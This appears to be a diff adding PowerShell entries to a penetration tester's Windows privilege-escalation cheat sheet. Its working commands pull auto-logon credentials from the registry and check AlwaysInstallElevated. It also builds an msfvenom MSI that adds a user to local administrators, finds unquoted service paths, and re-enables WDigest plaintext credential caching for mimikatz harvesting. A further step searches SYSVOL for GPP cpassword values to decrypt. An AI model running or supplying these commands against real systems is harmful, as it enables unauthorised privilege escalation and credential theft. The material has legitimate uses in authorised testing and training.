@@ -1,5 +1,40 @@
 Windows
 
+
+	PowerShell
+		
+		Search registry for auto-logon credentials
+		gp 'HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon' | select "Default*"
+
+		Check if AlwaysInstallElevated is enabled
+		gp 'HKCU:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated
+
+		gp 'HKLM:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated
+		Both registry keys must be 1 for reg. user to install .MSIs as SYSTEM
+
+			MSI installer package generated using msfvenom:
+			msfvenom -p windows/exec CMD='net localgroup administrators joe /add' -f msi > pkg.msi
+
+		Find unquoted service paths
+		gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
+
+		Check for LSASS WDigest caching (for mimikatz plaintext cred harvesting)
+		(gp registry::HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest).UseLogonCredential
+		If the value is set to 0, then the caching is disabled (system is protected)
+		If it doesn’t exist or if it is set to 1, then the caching is enabled
+
+			Enable it using the following command, and restart system:
+			sp registry::HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest -name UseLogonCredential -value 1
+
+		Credentials in SYSVOL and Group Policy Preferences (GPP)
+		Push-Location \\example.com\sysvol
+		gci * -Include *.xml,*.txt,*.bat,*.ps1,*.psm,*.psd -Recurse -EA SilentlyContinue | select-string password
+		Pop-Location
+		
+		One typical example is MS14-025 with cPassword attribute in the GPP XML files. The “cpassword” attribute can be instantly decrypted into a plaintext form e.g. by using gpp-decrypt utility in Kali Linux.
+
+
+
 	Metasploit
 		getsystem
 
